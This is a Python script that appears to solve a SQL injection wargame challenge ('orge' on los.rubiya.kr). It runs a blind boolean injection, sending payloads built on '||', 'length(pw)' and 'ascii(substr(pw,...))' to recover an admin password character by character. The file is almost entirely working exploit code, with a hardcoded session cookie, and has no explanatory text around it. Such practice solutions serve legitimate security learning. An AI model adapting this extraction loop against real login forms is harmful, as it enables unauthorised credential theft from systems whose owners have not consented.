import requests
import string

header = {"Cookie": "PHPSESSID=93bvl3l66u57rtt993gi4tn90d;"}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
string_data = string.digits + string.ascii_letters

print(string_data)

password = ""
password_len = 1

# find password length
while True:
    data = "?pw=' || id='admin' %26%26 length(pw)={}%23".format(str(password_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(password_len))
    password_len += 1
print("[+] Get Password Length : " + str(password_len))

# find password
for idx in range(1, password_len + 1):
    for i in string_data:
        # data = "?pw=' or id='admin' and pw like '{}{}%".format(password,i)
        # data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
        data = "?pw=' || id='admin' %26%26 ascii(substr(pw,{},1))={}%23".format(idx,ord(i))
        # print(data)
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            password = password + i
            print("[*] Finding... : " + password)
            break
print("[+] Found Password : " + password)